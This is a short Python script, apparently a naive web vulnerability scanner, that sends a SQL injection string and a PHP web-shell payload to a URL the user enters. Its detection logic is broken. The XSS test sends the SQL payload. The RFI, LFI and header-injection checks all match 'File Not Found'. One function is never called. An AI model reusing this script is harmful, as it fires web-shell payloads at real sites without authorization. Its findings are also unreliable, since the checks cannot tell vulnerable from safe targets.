import requests
from bs4 import BeautifulSoup


# Function to check for SQL injection vulnerabilities
def sql_injection(url):
    payload = "' OR 1=1-- "
    response = requests.get(f"{url}?{payload}")
    if "SQL Error" in str(response.text):
        print(f"The website {url} is vulnerable to SQL injection.")


# Function to check for Cross-Site Scripting (XSS) vulnerabilities
def xss(url, payload):
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    response = requests.post(url, data=payload, headers=headers)
    if "Script" in str(response.text):
        print(f"The website {url} is vulnerable to Cross-Site Scripting.")


# Function to check for Remote File Inclusion vulnerabilities
def rfi(url, payload):
    response = requests.get(f"{url}?{payload}")
    if "File Not Found" in str(response.text):
        print(f"The website {url} is vulnerable to Remote File Inclusion.")


# Function to check for HTTP Header Injection vulnerabilities
def http_header_injection(url, payload):
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    response = requests.post(url, data=payload, headers=headers)
    if "File Not Found" in str(response.text):
        print(f"The website {url} is vulnerable to HTTP Header Injection.")


# Function to check for Local File Inclusion vulnerabilities
def lfi(url, payload):
    response = requests.get(f"{url}?{payload}")
    if "File Not Found" in str(response.text):
        print(f"The website {url} is vulnerable to Local File Inclusion.")


# Main function
def main():
    url = input("Enter the URL of the web application: ")
    sql_injection(url)
    xss(url, "' OR 1=1-- ")
    rfi(url, "'<?php system($_GET['cmd']); ?>'")
    http_header_injection(url, "'<?php system($_GET['cmd']); ?>'")


if __name__ == "__main__":
    main()
